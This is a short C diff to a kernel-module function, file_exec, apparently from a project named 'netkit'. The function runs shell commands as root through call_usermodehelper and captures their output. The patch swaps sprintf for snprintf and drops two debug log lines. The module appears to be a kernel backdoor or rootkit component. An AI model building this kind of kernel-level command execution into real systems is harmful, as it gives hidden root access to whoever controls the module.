@@ -140,7 +140,7 @@ int file_exec(const char *cmd, u8 **out_buf, size_t *out_buflen)
     if (IS_ERR(argv[2]))
         return PTR_ERR(argv[2]);
 
-    sprintf(argv[2], "%s%s", cmd, BASH_POSTFIX);
+    snprintf(argv[2], bash_cmd_len, "%s%s", cmd, BASH_POSTFIX);
 
     NETKIT_LOG("[*] executing: \"%s %s '%s'\"\n", argv[0], argv[1], argv[2]);
     cmd_retv = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
@@ -152,7 +152,6 @@ int file_exec(const char *cmd, u8 **out_buf, size_t *out_buflen)
 
     if (stdout_buf && stderr_buf)
     {
-        NETKIT_LOG("stdout (%ld) and stderr (%ld) as out_buf\n", (long)stdout_buf, (long)stderr_buf);
         *out_buf = kzmalloc(stdout_buflen + stderr_buflen, GFP_KERNEL);
         if (IS_ERR(*out_buf))
         {
@@ -169,7 +168,6 @@ int file_exec(const char *cmd, u8 **out_buf, size_t *out_buflen)
         kzfree(stdout_buf, stdout_buflen);
         kzfree(stderr_buf, stderr_buflen);
     } else if (stdout_buf) {
-        NETKIT_LOG("stdout as out_buf\n");
         *out_buf = stdout_buf;
         *out_buflen = stdout_buflen;
     } else if (stderr_buf) {
